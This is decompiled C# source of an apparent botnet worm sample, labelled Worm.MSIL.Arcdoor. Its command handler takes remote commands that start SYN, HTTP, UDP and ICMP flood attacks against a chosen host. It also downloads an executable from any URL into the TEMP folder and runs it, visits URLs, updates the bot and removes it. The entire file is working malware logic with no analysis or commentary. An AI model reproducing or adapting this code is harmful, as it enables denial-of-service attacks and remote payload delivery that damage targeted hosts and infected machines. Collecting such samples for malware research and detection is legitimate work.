// Decompiled with JetBrains decompiler
// Type: SysDriver.cCommandHandler
// Assembly: SysDriver, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 591752E5-2C24-490A-AF88-A636AB72D7B7
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Worm.MSIL.Arcdoor.ae-9a70c0fa82dd869c7b769f53a0f2f245e58c379690ba2933aaf80f8e9c831958.exe

using System;
using System.Diagnostics;
using System.Net;

namespace SysDriver
{
  internal class cCommandHandler
  {
    public void handleCommand(string sCommand)
    {
      string[] strArray = new string[0];
      WebClient webClient = new WebClient();
      try
      {
        strArray = sCommand.Split('*');
      }
      catch
      {
      }
      switch (strArray[0])
      {
        case "synflood":
          try
          {
            nSYNFlood.sFHost = Convert.ToString(strArray[1]);
            nSYNFlood.uPort = ushort.Parse(strArray[2]);
            nSYNFlood.iThreads = Convert.ToInt32(strArray[3]);
            nSYNFlood.iSSockets = Convert.ToInt32(strArray[4]);
            nSYNFlood.StartSYNFlood();
            break;
          }
          catch
          {
            break;
          }
        case "httpflood":
          try
          {
            nHTTPFlood.sFHost = Convert.ToString(strArray[1]);
            nHTTPFlood.iThreads = Convert.ToInt32(strArray[2]);
            nHTTPFlood.StartHTTPFlood();
            break;
          }
          catch
          {
            break;
          }
        case "udpflood":
          try
          {
            nUDPFlood.sFHost = Convert.ToString(strArray[1]);
            nUDPFlood.uPort = ushort.Parse(strArray[2]);
            nUDPFlood.iThreads = Convert.ToInt32(strArray[3]);
            nUDPFlood.iUDPSockets = Convert.ToInt32(strArray[4]);
            nUDPFlood.iPSize = Convert.ToInt32(strArray[5]);
            nUDPFlood.StartUDPFlood();
            break;
          }
          catch
          {
            break;
          }
        case "icmpflood":
          try
          {
            nICMPFlood.sFHost = Convert.ToString(strArray[1]);
            nICMPFlood.iThreads = Convert.ToInt32(strArray[2]);
            nICMPFlood.iICMPSockets = Convert.ToInt32(strArray[3]);
            nICMPFlood.iPSize = Convert.ToInt32(strArray[4]);
            nICMPFlood.StartICMPFlood();
            break;
          }
          catch
          {
            break;
          }
        case "download":
          try
          {
            string str = cMain.FunctionClass.genString(new Random().Next(5, 12)) + ".exe";
            string address = Convert.ToString(strArray[1]);
            if (!address.StartsWith("http://"))
              address = "http://" + address;
            webClient.DownloadFile(address, Environment.GetEnvironmentVariable("TEMP") + "\\" + str);
            new Process()
            {
              StartInfo = {
                FileName = (Environment.GetEnvironmentVariable("TEMP") + "\\" + str)
              }
            }.Start();
            break;
          }
          catch
          {
            break;
          }
        case "visit":
          try
          {
            string URI = Convert.ToString(strArray[1]);
            if (!URI.StartsWith("http://"))
              URI = "http://" + URI;
            this.HTTPRequest(URI);
            break;
          }
          catch
          {
            break;
          }
        case "update":
          string sFileAddress = Convert.ToString(strArray[1]);
          if (!sFileAddress.StartsWith("http://"))
            sFileAddress = "http://" + sFileAddress;
          cMain.SystemClass.updateBot(sFileAddress);
          break;
        case "remove":
          if (!(strArray[1] == cMain.ConfigClass.sPCName) && !(strArray[1].ToUpper() == "ALL"))
            break;
          cMain.SystemClass.RemoveBot();
          break;
      }
    }

    private void HTTPRequest(string URI)
    {
      WebClient webClient = new WebClient();
      webClient.OpenRead(URI);
      webClient.Dispose();
    }
  }
}
